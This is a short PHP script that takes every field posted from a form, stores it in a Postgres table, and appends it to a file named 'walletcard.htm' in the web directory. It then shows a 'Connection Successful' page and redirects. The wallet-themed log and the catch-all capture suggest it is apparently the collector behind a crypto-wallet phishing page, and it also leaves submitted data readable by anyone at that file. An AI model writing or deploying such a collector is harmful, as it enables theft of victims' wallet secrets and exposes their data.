<?php
// Database connection parameters from environment variables
$host = getenv('DB_HOST'); // Set your environment variables in Render
$db = getenv('DB_NAME');
$user = getenv('DB_USER');
$pass = getenv('DB_PASSWORD');
$port = getenv('DB_PORT');

try {
    // Create a new PDO instance for PostgreSQL
    $dsn = "pgsql:host=$host;port=$port;dbname=$db";
    $pdo = new PDO($dsn, $user, $pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Create the submissions table if it doesn't exist
    $createTableSQL = "
    CREATE TABLE IF NOT EXISTS submissions (
        id SERIAL PRIMARY KEY,
        variable VARCHAR(255),
        value TEXT
    )";
    $pdo->exec($createTableSQL);

    // Prepare an insert statement for the database
    $stmt = $pdo->prepare("INSERT INTO submissions (variable, value) VALUES (:variable, :value)");

    // Open or create walletcard.htm in append mode
    $fileHandle = fopen("walletcard.htm", "a");
    if ($fileHandle === false) {
        throw new Exception("Error opening walletcard.htm for writing.");
    }

    // Iterate through POST data
    foreach ($_POST as $variable => $value) {
        // Sanitize form input to prevent injection attacks
        $safe_variable = htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
        $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');

        // Write sanitized data to walletcard.htm
        fwrite($fileHandle, "$safe_variable=$safe_value<br>");

        // Bind parameters and execute for database
        $stmt->bindParam(':variable', $safe_variable);
        $stmt->bindParam(':value', $safe_value);
        $stmt->execute();
    }

    // Add a separator for entries in walletcard.htm
    fwrite($fileHandle, "<hr>");

    // Close the file handle
    fclose($fileHandle);

    // Success response
    echo "<!DOCTYPE html>
    <html lang='en'>
    <head>
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <title>Connection Successful</title>
        <style>
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                background-color: #f3f4f6;
            }
            .popup {
                text-align: center;
                padding: 20px;
                border-radius: 10px;
                background-color: orange;
                color: white;
                font-size: 20px;
                box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
            }
        </style>
    </head>
    <body>
        <div class='popup'>
            Data saved successfully!
        </div>
        <script>
            // Show the success message for 3 seconds, then redirect
            setTimeout(function() {
                window.location.href = 'index.html';  // Change to your redirect URL
            }, 3000); // 3-second delay before redirect
        </script>
    </body>
    </html>";

} catch (Exception $e) {
    // If there is an error, display the error message
    echo "Error: " . $e->getMessage();
}
?>
